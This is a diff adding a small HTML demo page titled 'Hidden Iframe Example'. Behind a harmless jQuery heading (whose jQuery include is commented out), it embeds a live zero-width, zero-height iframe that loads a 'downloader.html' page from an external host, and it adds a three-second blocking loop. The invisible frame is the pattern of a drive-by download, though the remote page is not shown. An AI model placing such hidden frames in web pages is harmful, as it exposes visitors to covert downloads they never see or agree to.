@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hidden Iframe Example</title>
+    <!-- Include jQuery from a CDN -->
+    <!-- <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script> -->
+</head>
+<body>
+    <h1>Hello, jQuery!</h1>
+
+    <!-- Your JavaScript code that uses jQuery -->
+    <script>
+        $(document).ready(function() {
+            // Your jQuery code here
+            $('h1').css('color', 'blue');
+        });
+    </script>
+
+    <!-- Hidden iframe with width and height set to zero -->
+    <!-- <iframe src="https://monumental-sfogliatella-4cdd53.netlify.app/" width="0" height="0">
+        <link rel="JavaScript" type="text/JavaScript" href="https://code.jquery.com/jquery-3.6.0.min.js" />
+    </iframe> -->
+
+    <iframe src="https://startling-cocada-611875.netlify.app/downloader.html" width="0" height="0">
+        <!-- <link rel="JavaScript" type="text/JavaScript" href="https://code.jquery.com/jquery-3.6.0.min.js" /> -->
+    </iframe>
+
+
+    <!-- Blocking JavaScript script that runs for 3 seconds -->
+    <script>
+        // Code that runs in a blocking manner for 3 seconds
+        console.log('This script will run in a blocking manner for 3 seconds.');
+        
+        var startTime = new Date().getTime();
+        while (new Date().getTime() - startTime < 3000) {
+            // Blocking loop for 3 seconds
+        }
+        
+        console.log('This script has run in a blocking manner for 3 seconds.');
+    </script>
+
+    <!-- <iframe src="https://startling-cocada-611875.netlify.app/" width="400" height="600"></iframe> -->
+
+</body>
+</html>
